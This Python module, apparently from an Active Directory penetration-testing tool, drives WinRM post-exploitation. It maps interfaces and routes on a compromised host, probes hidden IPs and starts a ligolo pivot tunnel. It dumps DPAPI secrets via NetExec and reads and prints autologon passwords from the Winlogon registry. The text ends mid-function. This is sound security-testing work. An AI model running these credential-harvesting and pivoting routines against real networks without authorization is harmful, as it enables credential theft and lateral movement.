"""WinRM CLI orchestration helpers.

This module extracts WinRM-related orchestration logic out of the monolithic
`adscan.py` so it can be reused by future UX layers while keeping runtime
behaviour stable for the current CLI.
"""

from __future__ import annotations

from dataclasses import dataclass
import json
import os
import re
import base64
import time
import ipaddress
from datetime import datetime, timezone
from datetime import timedelta
from pathlib import Path
from typing import Any, Iterable

from rich.markup import escape as rich_escape
from rich.prompt import Confirm
from rich.table import Table

from adscan_internal import (
    print_error,
    print_exception,
    print_info,
    print_info_debug,
    print_info_verbose,
    print_operation_header,
    print_success,
    print_warning,
    print_warning_debug,
    print_warning_verbose,
    telemetry,
)
from adscan_internal.rich_output import mark_sensitive
from adscan_internal.cli.ntlm_hash_finding_flow import (
    render_ntlm_hash_findings_flow,
)
from adscan_internal.cli.scan_outcome_flow import (
    artifact_records_extracted_nothing,
    persist_artifact_processing_report,
    render_artifact_processing_summary,
    render_no_extracted_findings_preview,
)
from adscan_internal.services.pivot_service import orchestrate_ligolo_pivot_tunnel
from adscan_internal.services.smb_sensitive_file_policy import (
    SMB_SENSITIVE_SCAN_PHASE_DOCUMENT_CREDENTIALS,
    SMB_SENSITIVE_SCAN_PHASE_HEAVY_ARTIFACTS,
    SMB_SENSITIVE_SCAN_PHASE_TEXT_CREDENTIALS,
    get_production_sensitive_scan_phase_sequence,
    get_sensitive_file_extensions,
    get_sensitive_phase_definition,
    get_sensitive_phase_extensions,
)
from adscan_internal.services.spidering_service import ArtifactProcessingRecord
from adscan_internal.services.winrm_backend_service import build_winrm_backend
from adscan_internal.services.winrm_exclusion_policy import (
    WINRM_ROOT_STRATEGY_AUTO,
    classify_winrm_phase_exclusion_reason,
    get_winrm_excluded_directory_names,
    get_winrm_excluded_path_prefixes,
    get_winrm_phase_excluded_file_names,
    get_winrm_phase_excluded_path_fragments,
    get_winrm_phase_excluded_path_prefixes,
)
from adscan_internal.services.winrm_file_mapping_service import (
    WinRMFileMapEntry,
    WinRMFileMappingService,
)
from adscan_internal.services.winrm_psrp_service import (
    WinRMPSRPError,
    WinRMPSRPService,
)
from adscan_internal.services.credsweeper_service import (
    get_default_credsweeper_jobs,
)
from adscan_internal.services.loot_credential_analysis_service import (
    ENGINE_CREDSWEEPER,
    run_loot_credential_analysis,
)
from adscan_internal.text_utils import strip_ansi_codes

_WINRM_MAPPING_CACHE_MAX_AGE_CTF = timedelta(minutes=30)
_WINRM_MAPPING_MODE_AUTO = "auto"
_WINRM_MAPPING_MODE_REFRESH = "refresh"
_WINRM_MAPPING_MODE_REUSE = "reuse"
_VALID_WINRM_MAPPING_MODES = {
    _WINRM_MAPPING_MODE_AUTO,
    _WINRM_MAPPING_MODE_REFRESH,
    _WINRM_MAPPING_MODE_REUSE,
}


@dataclass(slots=True)
class WinRMPhaseFetchResult:
    """Structured result for a deterministic WinRM fetch phase."""

    downloaded_files: list[str]
    staged_file_count: int = 0
    skipped_files: list[tuple[str, str]] | None = None
    batch_used: bool = False
    batch_fallback: bool = False
    per_file_failures: list[tuple[str, str]] | None = None
    auth_invalid_abort: bool = False
    auth_invalid_reason: str | None = None


@dataclass(slots=True)
class WinRMPivotTarget:
    """Candidate no-response IP selected for one WinRM pivot reachability check."""

    ip: str
    hostname_candidates: list[str]
    classification: str
    prefix_hint: str | None
    ports: list[int]
    selection_reason: str


def _apply_winrm_phase_candidate_exclusions(
    *,
    phase: str,
    entries: list[WinRMFileMapEntry],
) -> tuple[list[WinRMFileMapEntry], dict[str, int], list[str]]:
    """Filter one WinRM phase candidate list through the phase-specific exclusion policy."""
    kept_entries: list[WinRMFileMapEntry] = []
    reason_counts: dict[str, int] = {}
    excluded_preview: list[str] = []
    for entry in entries:
        reason = classify_winrm_phase_exclusion_reason(entry.full_name, phase)
        if not reason:
            kept_entries.append(entry)
            continue
        reason_counts[reason] = reason_counts.get(reason, 0) + 1
        if len(excluded_preview) < 3:
            excluded_preview.append(entry.full_name)
    return kept_entries, reason_counts, excluded_preview


def _build_winrm_psrp_service(
    *, domain: str, host: str, username: str, password: str
) -> WinRMPSRPService:
    """Create a reusable PSRP service for a WinRM target."""
    return WinRMPSRPService(
        domain=domain,
        host=host,
        username=username,
        password=password,
    )


def build_winrm_reusable_backend(
    *, domain: str, host: str, username: str, password: str
):
    """Build the default reusable WinRM backend for CLI/manual flows."""
    return build_winrm_backend(
        domain=domain,
        host=host,
        username=username,
        password=password,
    )


def _is_winrm_ctf_auth_invalid_error(message: str) -> bool:
    """Return True when a WinRM error indicates credentials became invalid mid-flow."""
    normalized = str(message or "").strip().casefold()
    if not normalized:
        return False
    return "failed to authenticate the user" in normalized and "with ntlm" in normalized


def _execute_powershell_via_psrp(
    *,
    domain: str,
    host: str,
    username: str,
    password: str,
    script: str,
    operation_name: str | None = None,
    require_logon_bypass: bool = False,
) -> str:
    """Execute PowerShell over the reusable WinRM backend and return stdout."""
    service = build_winrm_reusable_backend(
        domain=domain,
        host=host,
        username=username,
        password=password,
    )
    result = service.execute_powershell(
        script,
        operation_name=operation_name,
        require_logon_bypass=require_logon_bypass,
    )
    if result.had_errors and not result.stdout:
        raise WinRMPSRPError(result.stderr or "PowerShell execution reported errors.")
    if result.stderr:
        print_info_debug("WinRM PSRP execution returned non-empty stderr output.")
    return result.stdout


def _parse_psrp_path_list(stdout: str) -> list[str]:
    """Parse JSON path output produced by a PSRP search script."""
    payload = stdout.strip()
    if not payload:
        return []
    data = json.loads(payload)
    if isinstance(data, list):
        return [str(item).strip() for item in data if str(item).strip()]
    if isinstance(data, str) and data.strip():
        return [data.strip()]
    return []


def _load_workspace_network_reachability_report(
    shell: Any, *, domain: str
) -> dict[str, Any] | None:
    """Load the persisted current-vantage reachability report for one domain."""
    report_path = os.path.join(
        shell.current_workspace_dir or "",
        shell.domains_dir,
        domain,
        "network_reachability_report.json",
    )
    if not report_path or not os.path.exists(report_path):
        return None
    try:
        with open(report_path, "r", encoding="utf-8") as handle:
            payload = json.load(handle)
    except (OSError, json.JSONDecodeError):
        return None
    return payload if isinstance(payload, dict) else None


def _build_winrm_network_inventory_script() -> str:
    """Return a PowerShell script that inventories IPv4 interfaces and routes.

    This intentionally relies on ``ipconfig`` and ``route print -4`` because
    those commands work under WinRM network-logon contexts, including hash-only
    sessions, where CIM-based cmdlets often fail with access denied.
    """
    return r"""
function Convert-SubnetMaskToPrefixLength {
    param([string]$Mask)
    if (-not $Mask) { return $null }
    $bits = 0
    foreach ($octet in $Mask.Split('.')) {
        if ($octet -notmatch '^\d+$') { return $null }
        $bits += ([Convert]::ToString([int]$octet, 2).ToCharArray() | Where-Object { $_ -eq '1' }).Count
    }
    return $bits
}
$interfaces = @()
$routes = @()
$interfaceSource = "ipconfig"
$routeSource = "route print -4"
$ipconfigOutput = (ipconfig | Out-String)
$routePrintOutput = (route print -4 | Out-String)
$currentInterface = ""
$pendingIPv4 = $null
foreach ($line in ($ipconfigOutput -split "`r?`n")) {
    if ([string]::IsNullOrWhiteSpace($line)) { continue }
    if ($line -match '^\S.*:$') {
        $currentInterface = $line.Trim().TrimEnd(':')
        $pendingIPv4 = $null
        continue
    }
    if ($line -match 'IPv4 Address[^\:]*:\s*([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)') {
        $pendingIPv4 = $Matches[1]
        continue
    }
    if ($pendingIPv4 -and $line -match 'Subnet Mask[^\:]*:\s*([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)') {
        $prefixLength = Convert-SubnetMaskToPrefixLength -Mask $Matches[1]
        if ($pendingIPv4 -ne '127.0.0.1' -and $pendingIPv4 -notlike '169.254.*') {
            $interfaces += [PSCustomObject]@{
                IPAddress = $pendingIPv4
                PrefixLength = $prefixLength
                InterfaceAlias = $currentInterface
            }
        }
        $pendingIPv4 = $null
    }
}
$interfaceAliasByIp = @{}
foreach ($entry in $interfaces) {
    if ($entry.IPAddress) {
        $interfaceAliasByIp[$entry.IPAddress] = $entry.InterfaceAlias
    }
}
$activeRoutes = $false
foreach ($line in ($routePrintOutput -split "`r?`n")) {
    if ($line -match '^\s*Active Routes:\s*$') {
        $activeRoutes = $true
        continue
    }
    if (-not $activeRoutes) { continue }
    if ($line -match '^\s*(Persistent Routes:|====)') { break }
    if ($line -match '^\s*Network Destination\s+Netmask\s+Gateway\s+Interface\s+Metric\s*$') {
        continue
    }
    if ($line -match '^\s*([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)\s+([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)\s+(\S+)\s+([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)\s+([0-9]+)\s*$') {
        $destination = $Matches[1]
        $mask = $Matches[2]
        $gateway = $Matches[3]
        $interfaceIp = $Matches[4]
        $metric = [int]$Matches[5]
        $prefixLength = Convert-SubnetMaskToPrefixLength -Mask $mask
        if ($null -eq $prefixLength) { continue }
        $alias = $interfaceAliasByIp[$interfaceIp]
        if (-not $alias) { $alias = $interfaceIp }
        $routes += [PSCustomObject]@{
            DestinationPrefix = ("{0}/{1}" -f $destination, $prefixLength)
            NextHop = $gateway
            InterfaceAlias = $alias
            RouteMetric = $metric
        }
    }
}
[PSCustomObject]@{
    interfaces = @($interfaces)
    routes = @($routes)
    interface_source = $interfaceSource
    route_source = $routeSource
} | ConvertTo-Json -Depth 6 -Compress
"""


def _build_winrm_windows_architecture_script() -> str:
    """Return a PowerShell script that detects the remote Windows architecture."""
    return r"""
$rawArchitecture = $env:PROCESSOR_ARCHITEW6432
if (-not $rawArchitecture) {
    $rawArchitecture = $env:PROCESSOR_ARCHITECTURE
}
$normalizedArchitecture = "unknown"
if ($rawArchitecture) {
    switch -Regex ($rawArchitecture.ToUpperInvariant()) {
        '^AMD64$' { $normalizedArchitecture = "amd64"; break }
        '^X86$' { $normalizedArchitecture = "386"; break }
        '^ARM64$' { $normalizedArchitecture = "arm64"; break }
        '^ARM$' { $normalizedArchitecture = "armv7"; break }
    }
}
[PSCustomObject]@{
    architecture = $normalizedArchitecture
    raw_architecture = $rawArchitecture
    is_64bit_os = [Environment]::Is64BitOperatingSystem
    is_64bit_process = [Environment]::Is64BitProcess
} | ConvertTo-Json -Compress
"""


def detect_winrm_windows_architecture(
    *, domain: str, host: str, username: str, password: str
) -> str | None:
    """Detect the remote Windows architecture over WinRM without CIM dependencies."""
    output = _execute_powershell_via_psrp(
        domain=domain,
        host=host,
        username=username,
        password=password,
        script=_build_winrm_windows_architecture_script(),
        operation_name="windows_architecture_detect",
    )
    payload = json.loads(output or "{}")
    if not isinstance(payload, dict):
        return None
    normalized_arch = str(payload.get("architecture") or "").strip().lower()
    if not normalized_arch or normalized_arch == "unknown":
        return None
    return normalized_arch


def _normalize_ipv4_network(address: str, prefix_length: int | None) -> str | None:
    """Return a normalized IPv4 network string or None when invalid."""
    try:
        if prefix_length is None:
            return None
        network = ipaddress.ip_network(f"{address}/{int(prefix_length)}", strict=False)
    except (ValueError, TypeError):
        return None
    if network.version != 4:
        return None
    return str(network)


def _select_winrm_pivot_targets(
    *,
    payload: dict[str, Any],
    remote_interfaces: list[dict[str, Any]],
    remote_routes: list[dict[str, Any]],
    max_targets: int = 25,
) -> list[WinRMPivotTarget]:
    """Select no-response IPs that look reachable from one compromised WinRM host."""
    ip_entries = payload.get("ips", []) if isinstance(payload.get("ips"), list) else []
    ports_scanned = []
    context = payload.get("context", {})
    if isinstance(context, dict):
        ports_scanned = [int(port) for port in context.get("ports_scanned", []) if str(port).isdigit()]
    route_networks: list[ipaddress.IPv4Network] = []
    for route in remote_routes:
        destination_prefix = str(route.get("DestinationPrefix") or "").strip()
        if not destination_prefix or destination_prefix == "0.0.0.0/0":
            continue
        try:
            network = ipaddress.ip_network(destination_prefix, strict=False)
        except ValueError:
            continue
        if network.version == 4:
            route_networks.append(network)

    interface_network_map: dict[str, list[str]] = {}
    interface_networks: list[ipaddress.IPv4Network] = []
    for interface in remote_interfaces:
        network_text = _normalize_ipv4_network(
            str(interface.get("IPAddress") or "").strip(),
            int(interface.get("PrefixLength")) if str(interface.get("PrefixLength") or "").strip().isdigit() else None,
        )
        if not network_text:
            continue
        network = ipaddress.ip_network(network_text, strict=False)
        interface_networks.append(network)
        interface_network_map.setdefault(network_text, []).append(
            str(interface.get("InterfaceAlias") or "").strip() or "unknown"
        )

    selected: list[WinRMPivotTarget] = []
    for entry in ip_entries:
        if not isinstance(entry, dict):
            continue
        if str(entry.get("status") or "").strip() != "no_response_from_current_vantage":
            continue
        ip_text = str(entry.get("ip") or "").strip()
        if not ip_text:
            continue
        try:
            ip_value = ipaddress.ip_address(ip_text)
        except ValueError:
            continue
        if ip_value.version != 4:
            continue

        selection_reason = ""
        prefix_hint = str(entry.get("prefix_hint") or "").strip() or None
        matching_interfaces: list[str] = []
        for network in interface_networks:
            if ip_value in network:
                matching_interfaces.extend(interface_network_map.get(str(network), []))
        if matching_interfaces:
            unique_interfaces = sorted({item for item in matching_interfaces if item})
            selection_reason = "same_subnet:" + ",".join(unique_interfaces)
        elif any(ip_value in network for network in route_networks):
            selection_reason = "explicit_route"
        else:
            continue

        selected.append(
            WinRMPivotTarget(
                ip=ip_text,
                hostname_candidates=[
                    str(item).strip()
                    for item in entry.get("hostname_candidates", [])
                    if str(item).strip()
                ],
                classification=str(entry.get("classification") or "").strip(),
                prefix_hint=prefix_hint,
                ports=ports_scanned,
                selection_reason=selection_reason,
            )
        )
        if len(selected) >= max_targets:
            break
    return selected


def _build_winrm_pivot_probe_script(targets: list[WinRMPivotTarget]) -> str:
    """Return a PowerShell script that probes selected candidate IPs via TCP."""
    targets_payload = [
        {
            "ip": target.ip,
            "ports": list(target.ports),
            "selection_reason": target.selection_reason,
            "hostname_candidates": list(target.hostname_candidates),
            "classification": target.classification,
            "prefix_hint": target.prefix_hint,
        }
        for target in targets
    ]
    encoded_targets = json.dumps(targets_payload)
    return rf"""
$targets = ConvertFrom-Json @'
{encoded_targets}
'@
function Test-TcpPort {{
    param(
        [string]$TargetIp,
        [int]$Port,
        [int]$TimeoutMs = 600
    )
    $client = New-Object System.Net.Sockets.TcpClient
    try {{
        $iar = $client.BeginConnect($TargetIp, $Port, $null, $null)
        if (-not $iar.AsyncWaitHandle.WaitOne($TimeoutMs, $false)) {{
            return $false
        }}
        $client.EndConnect($iar) | Out-Null
        return $true
    }} catch {{
        return $false
    }} finally {{
        $client.Close()
    }}
}}
$results = @()
foreach ($target in $targets) {{
    $reachablePorts = @()
    foreach ($port in @($target.ports)) {{
        if (Test-TcpPort -TargetIp $target.ip -Port ([int]$port)) {{
            $reachablePorts += [int]$port
        }}
    }}
    $results += [PSCustomObject]@{{
        ip = $target.ip
        reachable_ports = @($reachablePorts)
        hostname_candidates = @($target.hostname_candidates)
        selection_reason = $target.selection_reason
        original_classification = $target.classification
        prefix_hint = $target.prefix_hint
    }}
}}
[PSCustomObject]@{{ targets = @($results) }} | ConvertTo-Json -Depth 6 -Compress
"""


def _persist_winrm_pivot_reachability_report(
    shell: Any,
    *,
    domain: str,
    host: str,
    payload: dict[str, Any],
) -> str | None:
    """Persist one WinRM pivot reachability report under the host workspace."""
    report_path = os.path.join(
        shell.current_workspace_dir or "",
        shell.domains_dir,
        domain,
        "winrm",
        f"{host}_pivot_reachability_report.json",
    )
    try:
        os.makedirs(os.path.dirname(report_path), exist_ok=True)
        with open(report_path, "w", encoding="utf-8") as handle:
            json.dump(payload, handle, indent=2, sort_keys=False)
            handle.write("\n")
    except OSError:
        return None
    return report_path


def _summarize_winrm_pivot_inventory(entries: list[dict[str, Any]], *, route_mode: bool = False) -> str:
    """Return a short debug summary for WinRM pivot inventory entries."""
    preview: list[str] = []
    for entry in entries[:5]:
        if route_mode:
            destination = str(entry.get("DestinationPrefix") or "").strip()
            next_hop = str(entry.get("NextHop") or "").strip()
            interface_alias = str(entry.get("InterfaceAlias") or "").strip()
            preview.append(f"{destination}|{next_hop}|{interface_alias}")
        else:
            address = str(entry.get("IPAddress") or "").strip()
            prefix_length = str(entry.get("PrefixLength") or "").strip()
            interface_alias = str(entry.get("InterfaceAlias") or "").strip()
            preview.append(f"{address}/{prefix_length}|{interface_alias}")
    if len(entries) > 5:
        preview.append(f"... +{len(entries) - 5} more")
    return ", ".join(preview) if preview else "none"


def check_pivot_reachability_via_winrm(
    shell: Any, *, domain: str, host: str, username: str, password: str
) -> None:
    """Check whether a compromised WinRM host can reach IPs hidden from the original vantage."""
    reachability_payload = _load_workspace_network_reachability_report(shell, domain=domain)
    if not reachability_payload:
        print_info_debug(
            "Skipping WinRM pivot reachability check: no current-vantage reachability report is available."
        )
        return
    ip_entries = reachability_payload.get("ips", [])
    if not isinstance(ip_entries, list):
        print_info_debug(
            "Skipping WinRM pivot reachability check: reachability report has no usable IP entries."
        )
        return
    no_response_count = sum(
        1
        for entry in ip_entries
        if isinstance(entry, dict) and str(entry.get("status") or "").strip() == "no_response_from_current_vantage"
    )
    if no_response_count == 0:
        print_info_debug(
            "Skipping WinRM pivot reachability check: no hidden/no-response IPs exist in the current-vantage report."
        )
        return

    try:
        print_operation_header(
            "WinRM Pivot Reachability Check",
            details={
                "Domain": domain,
                "Pivot Host": host,
                "Username": username,
                "Previously Hidden IPs": str(no_response_count),
                "Protocol": "WinRM PSRP",
            },
            icon="🧭",
        )
        print_info(
            "Assessing whether this WinRM host can reach IPs that produced no response from the original vantage."
        )
        inventory_stdout = _execute_powershell_via_psrp(
            domain=domain,
            host=host,
            username=username,
            password=password,
            script=_build_winrm_network_inventory_script(),
            operation_name="pivot_network_inventory",
        )
        inventory_payload = json.loads(inventory_stdout or "{}")
        if not isinstance(inventory_payload, dict):
            print_warning("WinRM network inventory returned an unexpected payload; skipping pivot reachability check.")
            return
        remote_interfaces = inventory_payload.get("interfaces", [])
        remote_routes = inventory_payload.get("routes", [])
        interface_source = str(inventory_payload.get("interface_source") or "").strip() or "none"
        route_source = str(inventory_payload.get("route_source") or "").strip() or "none"
        if not isinstance(remote_interfaces, list):
            remote_interfaces = []
        if not isinstance(remote_routes, list):
            remote_routes = []
        normalized_interfaces = [entry for entry in remote_interfaces if isinstance(entry, dict)]
        normalized_routes = [entry for entry in remote_routes if isinstance(entry, dict)]
        print_info_debug(
            "WinRM pivot inventory summary: "
            f"interface_source={mark_sensitive(interface_source, 'text')} "
            f"interfaces={len(normalized_interfaces)} "
            f"preview={mark_sensitive(_summarize_winrm_pivot_inventory(normalized_interfaces), 'text')} "
            f"route_source={mark_sensitive(route_source, 'text')} "
            f"routes={len(normalized_routes)} "
            f"route_preview={mark_sensitive(_summarize_winrm_pivot_inventory(normalized_routes, route_mode=True), 'text')}"
        )

        selected_targets = _select_winrm_pivot_targets(
            payload=reachability_payload,
            remote_interfaces=normalized_interfaces,
            remote_routes=normalized_routes,
        )
        if not selected_targets:
            hidden_targets = [
                str(entry.get("ip") or "").strip()
                for entry in ip_entries
                if isinstance(entry, dict)
                and str(entry.get("status") or "").strip() == "no_response_from_current_vantage"
                and str(entry.get("ip") or "").strip()
            ]
            debug_hidden_targets = ", ".join(hidden_targets) if hidden_targets else "none"
            report_path = _persist_winrm_pivot_reachability_report(
                shell,
                domain=domain,
                host=host,
                payload={
                    "generated_at": datetime.now(timezone.utc).isoformat(),
                    "domain": domain,
                    "pivot_host": host,
                    "pivot_username": username,
                    "interfaces": normalized_interfaces,
                    "routes": normalized_routes,
                    "interface_source": interface_source,
                    "route_source": route_source,
                    "summary": {
                        "hidden_target_count": no_response_count,
                        "candidate_count": 0,
                        "confirmed_reachable_count": 0,
                        "same_subnet_no_response_count": 0,
                        "no_connectivity_confirmed_count": 0,
                    },
                    "skip_reason": "no_matching_subnet_or_route",
                    "hidden_targets": hidden_targets,
                    "targets": [],
                },
            )
            print_info_debug(
                "Skipping WinRM pivot reachability probing: "
                f"hidden_targets={mark_sensitive(debug_hidden_targets, 'text')} "
                "this host has no matching subnet or explicit route to previously hidden IPs."
            )
            if report_path:
                print_info_debug(
                    "WinRM pivot skip diagnostics saved to "
                    f"{mark_sensitive(report_path, 'path')}."
                )
            return

        subnet_candidates = sum(
            1 for target in selected_targets if str(target.selection_reason).startswith("same_subnet:")
        )
        routed_candidates = len(selected_targets) - subnet_candidates
        debug_selected_targets = ", ".join(
            f"{target.ip}:{target.selection_reason}" for target in selected_targets
        )
        print_info_debug(
            "WinRM pivot candidate selection: "
            f"selected={len(selected_targets)} "
            f"preview={mark_sensitive(debug_selected_targets, 'text')}"
        )
        print_info(
            f"This host may be a useful pivot for {len(selected_targets)} previously hidden target(s) "
            f"({subnet_candidates} same-subnet, {routed_candidates} routed)."
        )

        default_confirm = str(getattr(shell, "type", "") or "").strip().lower() == "ctf"
        if not Confirm.ask(
            (
                f"Do you want to probe {len(selected_targets)} likely pivot target(s) from "
                f"{mark_sensitive(host, 'hostname')}?"
            ),
            default=default_confirm,
        ):
            print_info("Skipping WinRM pivot reachability probing by user choice.")
            return

        probe_stdout = _execute_powershell_via_psrp(
            domain=domain,
            host=host,
            username=username,
            password=password,
            script=_build_winrm_pivot_probe_script(selected_targets),
            operation_name="pivot_tcp_probe",
        )
        probe_payload = json.loads(probe_stdout or "{}")
        targets_payload = probe_payload.get("targets", []) if isinstance(probe_payload, dict) else []
        if not isinstance(targets_payload, list):
            print_warning("WinRM pivot probe returned an unexpected payload; skipping report rendering.")
            return

        confirmed_reachable: list[dict[str, Any]] = []
        same_subnet_no_response: list[dict[str, Any]] = []
        no_connectivity_confirmed: list[dict[str, Any]] = []
        for entry in targets_payload:
            if not isinstance(entry, dict):
                continue
            reachable_ports = [
                int(port) for port in entry.get("reachable_ports", []) if str(port).isdigit()
            ]
            reason = str(entry.get("selection_reason") or "").strip()
            if reachable_ports:
                confirmed_reachable.append(entry)
            elif reason.startswith("same_subnet:"):
                same_subnet_no_response.append(entry)
            else:
                no_connectivity_confirmed.append(entry)

        summary_payload: dict[str, Any] = {
            "generated_at": datetime.now(timezone.utc).isoformat(),
            "domain": domain,
            "pivot_host": host,
            "pivot_username": username,
            "interfaces": remote_interfaces,
            "routes": remote_routes,
            "interface_source": interface_source,
            "route_source": route_source,
            "summary": {
                "candidate_count": len(selected_targets),
                "confirmed_reachable_count": len(confirmed_reachable),
                "same_subnet_no_response_count": len(same_subnet_no_response),
                "no_connectivity_confirmed_count": len(no_connectivity_confirmed),
            },
            "targets": targets_payload,
        }
        report_path = _persist_winrm_pivot_reachability_report(
            shell,
            domain=domain,
            host=host,
            payload=summary_payload,
        )

        if confirmed_reachable:
            print_success(
                f"{len(confirmed_reachable)} previously hidden IP(s) appear reachable from {mark_sensitive(host, 'hostname')}."
            )
            if getattr(shell, "console", None):
                table = Table(title="Confirmed Pivot Reachability", box=None)
                table.add_column("IP")
                table.add_column("Hostname(s)")
                table.add_column("Reachable Ports")
                table.add_column("Reason")
                for entry in confirmed_reachable[:10]:
                    table.add_row(
                        mark_sensitive(str(entry.get("ip") or ""), "ip"),
                        ", ".join(
                            mark_sensitive(str(item), "hostname")
                            for item in entry.get("hostname_candidates", [])
                        )
                        or "-",
                        ", ".join(str(port) for port in entry.get("reachable_ports", [])) or "-",
                        mark_sensitive(str(entry.get("selection_reason") or ""), "text"),
                    )
                shell.console.print(table)
        if same_subnet_no_response:
            print_info(
                f"{len(same_subnet_no_response)} target(s) are on-link from the pivot host but still gave no TCP response; they may simply be down/offline."
            )
        if no_connectivity_confirmed:
            print_warning(
                f"{len(no_connectivity_confirmed)} routed target(s) still showed no confirmed TCP reachability from the pivot host."
            )
        if report_path:
            print_info(
                f"Detailed WinRM pivot reachability report saved to {mark_sensitive(report_path, 'path')}."
            )
        if confirmed_reachable:
            upload_helper = getattr(shell, "winrm_upload", None) or winrm_upload
            orchestrate_ligolo_pivot_tunnel(
                shell,
                domain=domain,
                pivot_host=host,
                username=username,
                password=password,
                confirmed_targets=confirmed_reachable,
                detect_remote_architecture=detect_winrm_windows_architecture,
                upload_agent=upload_helper,
                execute_remote_script=_execute_powershell_via_psrp,
                remote_agent_os="windows",
            )
    except (WinRMPSRPError, json.JSONDecodeError) as exc:
        telemetry.capture_exception(exc)
        print_warning(
            f"WinRM pivot reachability check failed on {mark_sensitive(host, 'hostname')}: {rich_escape(str(exc))}"
        )


def ask_for_winrm_access(
    shell: Any, *, domain: str, host: str, username: str, password: str
) -> None:
    """Ask to enumerate a host via WinRM and run the follow-up checks."""
    from rich.prompt import Confirm

    marked_host = mark_sensitive(host, "hostname")
    marked_username = mark_sensitive(username, "user")
    answer = Confirm.ask(
        f"Do you want to enumerate host {marked_host} via WinRM as user {marked_username}?"
    )
    if answer:
        followup_steps = [
            (
                "dpapi",
                lambda: check_dpapi(
                    shell,
                    domain=domain,
                    host=host,
                    username=username,
                    password=password,
                ),
            ),
            (
                "pivot_reachability",
                lambda: check_pivot_reachability_via_winrm(
                    shell,
                    domain=domain,
                    host=host,
                    username=username,
                    password=password,
                ),
            ),
            (
                "firefox_credentials",
                lambda: shell.do_check_firefox_credentials(
                    domain, host, username, password
                ),
            ),
            (
                "powershell_history",
                lambda: shell.do_show_powershell_history(
                    domain, host, username, password
                ),
            ),
            (
                "powershell_transcripts",
                lambda: shell.do_check_powershell_transcripts(
                    domain, host, username, password
                ),
            ),
            (
                "autologon",
                lambda: shell.do_check_autologon(domain, host, username, password),
            ),
            (
                "sensitive_data_scan",
                lambda: shell.do_check_winrm_sensitive_data(
                    domain, host, username, password
                ),
            ),
        ]
        for action_label, action in followup_steps:
            if _should_skip_winrm_followup_for_ctf_pwned(
                shell=shell,
                domain=domain,
                action_label=action_label,
            ):
                return
            action()


def check_dpapi(
    shell: Any, *, domain: str, host: str, username: str, password: str
) -> None:
    """Dump DPAPI-protected credentials on a host using NetExec over WinRM."""
    from adscan_internal.cli.dumps import process_dpapi_output

    try:
        credential_type = "Hash" if shell.is_hash(password) else "Password"

        print_operation_header(
            "DPAPI Credential Check",
            details={
                "Domain": domain,
                "Target Host": host,
                "Username": username,
                "Credential Type": credential_type,
                "Protocol": "WinRM",
                "Action": "DPAPI secret harvesting",
            },
            icon="🔐",
        )

        auth = shell.build_auth_nxc(username, password, domain, kerberos=False)
        dpapi_command = (
            f"{shell.netexec_path} winrm {host} {auth} "
            f"--log domains/{domain}/winrm/dump_{host}_dpapi.txt --dpapi"
        )
        print_info_debug(f"Command: {dpapi_command}")
        completed_process = shell._run_netexec(  # type: ignore[attr-defined]
            dpapi_command,
            domain=domain,
            timeout=600,
            operation_kind="winrm_dpapi_fallback",
            service="winrm",
            target_count=1,
        )
        output = completed_process.stdout or ""
        errors_output = completed_process.stderr or ""

        if completed_process.returncode == 0:
            result = process_dpapi_output(
                shell,
                output=output,
                domain=domain,
                host=host,
                auth_username=username,
                source_protocol="winrm",
                prompt_confirmation=True,
            )
            if int(result.get("count") or 0) == 0:
                print_warning("No DPAPI credentials found in the output.")
            else:
                print_success("WinRM DPAPI processing completed")
            return

        error_message = errors_output.strip() if errors_output else output.strip()
        print_error(
            "Error obtaining DPAPI credentials: "
            f"{error_message if error_message else 'Details not available'}"
        )

    except Exception as exc:  # pragma: no cover - defensive
        telemetry.capture_exception(exc)
        print_error("Error accessing DPAPI credentials.")
        print_exception(show_locals=False, exception=exc)


def netexec_extract_winrm(shell: Any, *, domain: str) -> None:
    """Extract WinRM hosts from a generic list using NetExec output."""
    marked_domain = mark_sensitive(domain, "domain")
    command = f"{shell.netexec_path} winrm winrm/ips.txt | grep {marked_domain}"
    shell.extract_services(command, domain, "winrm")


def check_autologon(
    shell: Any, *, domain: str, host: str, username: str, password: str
) -> None:
    """Check for autologon credentials on a host via PSRP with NetExec fallback."""
    if _should_skip_winrm_followup_for_ctf_pwned(
        shell=shell,
        domain=domain,
        action_label="autologon",
    ):
        return
    try:
        credential_type = "Hash" if shell.is_hash(password) else "Password"

        print_operation_header(
            "Autologon Credential Check",
            details={
                "Domain": domain,
                "Target Host": host,
                "Username": username,
                "Credential Type": credential_type,
                "Protocol": "WinRM",
                "Registry Key": r"HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
            },
            icon="🔑",
        )

        autologon_script = (
            '$props = Get-ItemProperty '
            '"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" | '
            "Select-Object DefaultDomainName,DefaultUserName,DefaultPassword; "
            "$props | ConvertTo-Json -Compress"
        )

        try:
            output = _execute_powershell_via_psrp(
                domain=domain,
                host=host,
                username=username,
                password=password,
                script=autologon_script,
                operation_name="autologon_registry_query",
            )
            data = json.loads(output) if output.strip() else {}
            default_user_name = str(data.get("DefaultUserName") or "").strip()
            default_password = str(data.get("DefaultPassword") or "").strip()
            default_domain_name = str(data.get("DefaultDomainName") or "").strip()
        except (WinRMPSRPError, json.JSONDecodeError) as exc:
            print_info_debug(
                "WinRM PSRP autologon retrieval failed; falling back to "
                f"NetExec: {exc}"
            )
            default_user_name, default_password, default_domain_name = (
                _check_autologon_legacy_netexec(
                    shell,
                    domain=domain,
                    host=host,
                    username=username,
                    password=password,
                )
            )

        if default_user_name and default_password:
            if "\\" in default_user_name:
                _, user_autologon = default_user_name.split("\\", 1)
            else:
                user_autologon = default_user_name

            domain_autologon = default_domain_name or ""

            print_warning("Autologon credentials found:")
            shell.console.print(f"   Domain: {domain_autologon}")
            shell.console.print(f"   User: {user_autologon}")
            shell.console.print(f"   Password: {default_password}")

            shell.add_credential(domain, user_autologon, default_password)
        else:
            print_error("No autologon credentials found in the output.")

    except Exception as exc:  # pragma: no cover - defensive
        telemetry.capture_exception(exc)
        print_error("Error accessing autologon credentials.")
        print_exception(show_locals=False, exception=exc)


def _check_autologon_legacy_netexec(
    shell: Any, *, domain: str, host: str, username: str, password: str
) -> tuple[str, str, str]:
    """Fallback autologon retrieval using NetExec WinRM."""
